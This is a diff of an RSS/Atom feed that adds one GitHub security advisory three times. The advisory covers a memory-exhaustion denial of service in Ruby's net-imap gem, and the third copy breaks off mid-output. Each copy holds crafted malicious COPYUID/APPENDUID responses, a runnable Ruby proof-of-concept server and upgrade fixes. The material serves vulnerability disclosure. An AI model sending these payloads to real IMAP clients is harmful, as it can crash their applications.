@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2025-02-10T17:01:21.389Z</updated>
+    <updated>2025-02-10T18:01:30.497Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,606 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
+        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
+        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
+        <updated>2025-02-10T17:42:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
+<h3 id="details">Details</h3>
+<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
+<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
+<p>Malicious inputs:</p>
+<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
+"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"
+
+# Worst *valid* input scenario (using uint32 max),
+# 44 bytes expands to 64GiB:
+"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"
+
+# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
+# UINT32_MAX can be created.  For example, the following would theoretically
+# expand to almost 800 exabytes:
+"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
+</code></pre>
+<p>Simple way to test this:</p>
+<pre><code class="language-ruby">require "net/imap"
+
+def test(size)
+  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\n"
+  parser = Net::IMAP::ResponseParser.new
+  parser.parse input
+end
+
+test(99_999_999)
+</code></pre>
+<h3 id="fixes">Fixes</h3>
+<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
+<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
+<pre><code class="language-ruby"># globally
+Net::IMAP.config.parser_use_deprecated_uidplus_data = false
+# per-client
+imap = Net::IMAP.new(hostname, ssl: true,
+                               parser_use_deprecated_uidplus_data: false)
+imap.config.parser_use_deprecated_uidplus_data = false
+</code></pre>
+<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
+<p>For v0.3.8, this option is not available.
+For v0.4.19, the default value is <code>true</code>.
+For v0.5.6, the default value is <code>:up_to_max_size</code>.
+For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
+<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
+<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
+<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
+When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.
+When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
+<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
+For v0.4.19, the limit defaults to 1000.
+For v0.5.6, the limit defaults to 100.
+For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
+<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
+<pre><code class="language-ruby">limit = 1000
+imap.add_response_handler do |resp|
+  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
+  name = resp.name
+  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
+  if Net::IMAP::VERSION &gt; "0.4.0"
+    imap.responses(name) { _1.slice!(0...-limit) }
+    imap.responses(code) { _1.slice!(0...-limit) }
+  else
+    imap.responses(name).slice!(0...-limit)
+    imap.responses(code).slice!(0...-limit)
+  end
+end
+</code></pre>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require 'socket'
+require 'net/imap'
+
+if !defined?(Net::IMAP.config)
+  puts "Net::IMAP.config is not available"
+elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
+  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
+else
+  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
+  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
+end
+
+size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)
+
+def server_addr
+  Addrinfo.tcp("localhost", 0).ip_address
+end
+
+def create_tcp_server
+  TCPServer.new(server_addr, 0)
+end
+
+def start_server
+  th = Thread.new do
+    yield
+  end
+  sleep 0.1 until th.stop?
+end
+
+def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
+end
+
+def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
+end
+
+server = create_tcp_server
+port = server.addr[1]
+puts "Server started on port #{port}"
+
+# server
+start_server do
+  sock = server.accept
+  begin
+    sock.print "* OK test server\r\n"
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+
+    malicious_response = appenduid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+
+    malicious_response = copyuid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
+    sock.print "#{tag} OK CAPABILITY completed\r\n"
+
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+    sock.print "* BYE If you made it this far, you passed the test!\r\n"
+    sock.print "#{tag} OK LOGOUT completed\r\n"
+  rescue Exception =&gt; ex
+    puts "Error in server: #{ex.message} (#{ex.class})"
+  ensure
+    sock.close
+    server.close
+  end
+end
+
+# client
+begin
+  puts "Client connecting,.."
+  imap = Net::IMAP.new(server_addr, port: port)
+  puts "Received capabilities: #{imap.capability}"
+  pp responses: imap.responses
+  imap.logout
+rescue Exception =&gt; ex
+  puts "Error in client: #{ex.message} (#{ex.class})"
+  puts ex.full_message
+ensure
+  imap.disconnect if imap
+end
+</code></pre>
+<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
+<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
+Server started on port 34291
+Client connecting,..
+Received: RUBY0001 CAPABILITY
+Sending: * OK [APPENDUID 1 1:4294967295] too large?
+Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
+Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
+Error in client: failed to allocate memory (NoMemoryError)
+/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
+        from /workspace/poc.rb:70:in '&lt;main&gt;'
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
+<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
+<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-02-10T17:42:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
+        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
+        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
+        <updated>2025-02-10T17:42:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
+<h3 id="details">Details</h3>
+<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
+<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
+<p>Malicious inputs:</p>
+<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
+"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"
+
+# Worst *valid* input scenario (using uint32 max),
+# 44 bytes expands to 64GiB:
+"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"
+
+# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
+# UINT32_MAX can be created.  For example, the following would theoretically
+# expand to almost 800 exabytes:
+"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
+</code></pre>
+<p>Simple way to test this:</p>
+<pre><code class="language-ruby">require "net/imap"
+
+def test(size)
+  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\n"
+  parser = Net::IMAP::ResponseParser.new
+  parser.parse input
+end
+
+test(99_999_999)
+</code></pre>
+<h3 id="fixes">Fixes</h3>
+<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
+<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
+<pre><code class="language-ruby"># globally
+Net::IMAP.config.parser_use_deprecated_uidplus_data = false
+# per-client
+imap = Net::IMAP.new(hostname, ssl: true,
+                               parser_use_deprecated_uidplus_data: false)
+imap.config.parser_use_deprecated_uidplus_data = false
+</code></pre>
+<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
+<p>For v0.3.8, this option is not available.
+For v0.4.19, the default value is <code>true</code>.
+For v0.5.6, the default value is <code>:up_to_max_size</code>.
+For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
+<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
+<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
+<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
+When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.
+When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
+<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
+For v0.4.19, the limit defaults to 1000.
+For v0.5.6, the limit defaults to 100.
+For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
+<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
+<pre><code class="language-ruby">limit = 1000
+imap.add_response_handler do |resp|
+  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
+  name = resp.name
+  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
+  if Net::IMAP::VERSION &gt; "0.4.0"
+    imap.responses(name) { _1.slice!(0...-limit) }
+    imap.responses(code) { _1.slice!(0...-limit) }
+  else
+    imap.responses(name).slice!(0...-limit)
+    imap.responses(code).slice!(0...-limit)
+  end
+end
+</code></pre>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require 'socket'
+require 'net/imap'
+
+if !defined?(Net::IMAP.config)
+  puts "Net::IMAP.config is not available"
+elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
+  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
+else
+  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
+  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
+end
+
+size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)
+
+def server_addr
+  Addrinfo.tcp("localhost", 0).ip_address
+end
+
+def create_tcp_server
+  TCPServer.new(server_addr, 0)
+end
+
+def start_server
+  th = Thread.new do
+    yield
+  end
+  sleep 0.1 until th.stop?
+end
+
+def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
+end
+
+def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
+end
+
+server = create_tcp_server
+port = server.addr[1]
+puts "Server started on port #{port}"
+
+# server
+start_server do
+  sock = server.accept
+  begin
+    sock.print "* OK test server\r\n"
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+
+    malicious_response = appenduid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+
+    malicious_response = copyuid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
+    sock.print "#{tag} OK CAPABILITY completed\r\n"
+
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+    sock.print "* BYE If you made it this far, you passed the test!\r\n"
+    sock.print "#{tag} OK LOGOUT completed\r\n"
+  rescue Exception =&gt; ex
+    puts "Error in server: #{ex.message} (#{ex.class})"
+  ensure
+    sock.close
+    server.close
+  end
+end
+
+# client
+begin
+  puts "Client connecting,.."
+  imap = Net::IMAP.new(server_addr, port: port)
+  puts "Received capabilities: #{imap.capability}"
+  pp responses: imap.responses
+  imap.logout
+rescue Exception =&gt; ex
+  puts "Error in client: #{ex.message} (#{ex.class})"
+  puts ex.full_message
+ensure
+  imap.disconnect if imap
+end
+</code></pre>
+<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
+<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
+Server started on port 34291
+Client connecting,..
+Received: RUBY0001 CAPABILITY
+Sending: * OK [APPENDUID 1 1:4294967295] too large?
+Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
+Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
+Error in client: failed to allocate memory (NoMemoryError)
+/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
+        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
+        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
+        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
+        from /workspace/poc.rb:70:in '&lt;main&gt;'
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
+<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
+<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-02-10T17:42:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
+        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
+        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
+        <updated>2025-02-10T17:42:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
+<h3 id="details">Details</h3>
+<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
+<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
+<p>Malicious inputs:</p>
+<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
+"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"
+
+# Worst *valid* input scenario (using uint32 max),
+# 44 bytes expands to 64GiB:
+"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"
+
+# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
+# UINT32_MAX can be created.  For example, the following would theoretically
+# expand to almost 800 exabytes:
+"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
+</code></pre>
+<p>Simple way to test this:</p>
+<pre><code class="language-ruby">require "net/imap"
+
+def test(size)
+  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\n"
+  parser = Net::IMAP::ResponseParser.new
+  parser.parse input
+end
+
+test(99_999_999)
+</code></pre>
+<h3 id="fixes">Fixes</h3>
+<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
+<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
+<pre><code class="language-ruby"># globally
+Net::IMAP.config.parser_use_deprecated_uidplus_data = false
+# per-client
+imap = Net::IMAP.new(hostname, ssl: true,
+                               parser_use_deprecated_uidplus_data: false)
+imap.config.parser_use_deprecated_uidplus_data = false
+</code></pre>
+<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
+<p>For v0.3.8, this option is not available.
+For v0.4.19, the default value is <code>true</code>.
+For v0.5.6, the default value is <code>:up_to_max_size</code>.
+For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
+<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
+<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
+<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
+When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.
+When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
+<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
+For v0.4.19, the limit defaults to 1000.
+For v0.5.6, the limit defaults to 100.
+For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
+<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
+<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
+<pre><code class="language-ruby">limit = 1000
+imap.add_response_handler do |resp|
+  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
+  name = resp.name
+  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
+  if Net::IMAP::VERSION &gt; "0.4.0"
+    imap.responses(name) { _1.slice!(0...-limit) }
+    imap.responses(code) { _1.slice!(0...-limit) }
+  else
+    imap.responses(name).slice!(0...-limit)
+    imap.responses(code).slice!(0...-limit)
+  end
+end
+</code></pre>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require 'socket'
+require 'net/imap'
+
+if !defined?(Net::IMAP.config)
+  puts "Net::IMAP.config is not available"
+elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
+  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
+else
+  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
+  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
+end
+
+size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)
+
+def server_addr
+  Addrinfo.tcp("localhost", 0).ip_address
+end
+
+def create_tcp_server
+  TCPServer.new(server_addr, 0)
+end
+
+def start_server
+  th = Thread.new do
+    yield
+  end
+  sleep 0.1 until th.stop?
+end
+
+def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
+end
+
+def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
+  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
+end
+
+server = create_tcp_server
+port = server.addr[1]
+puts "Server started on port #{port}"
+
+# server
+start_server do
+  sock = server.accept
+  begin
+    sock.print "* OK test server\r\n"
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+
+    malicious_response = appenduid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+
+    malicious_response = copyuid_response(size:)
+    puts "Sending: #{malicious_response.chomp}"
+    sock.print malicious_response
+    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
+    sock.print "#{tag} OK CAPABILITY completed\r\n"
+
+    cmd = sock.gets("\r\n", chomp: true)
+    tag = cmd.match(/\A(\w+) /)[1]
+    puts "Received: #{cmd}"
+    sock.print "* BYE If you made it this far, you passed the test!\r\n"
+    sock.print "#{tag} OK LOGOUT completed\r\n"
+  rescue Exception =&gt; ex
+    puts "Error in server: #{ex.message} (#{ex.class})"
+  ensure
+    sock.close
+    server.close
+  end
+end
+
+# client
+begin
+  puts "Client connecting,.."
+  imap = Net::IMAP.new(server_addr, port: port)
+  puts "Received capabilities: #{imap.capability}"
+  pp responses: imap.responses
+  imap.logout
+rescue Exception =&gt; ex
+  puts "Error in client: #{ex.message} (#{ex.class})"
+  puts ex.full_message
+ensure
+  imap.disconnect if imap
+end
+</code></pre>
+<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
+<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
+Server started on port 34291
+Client connecting,..
+Received: RUBY0001 CAPABILITY
+Sending: * OK [APPENDUID 1 1:4294967295] too large?
+Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
+Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
+Error in client: failed to allocate memory (NoMemoryError)
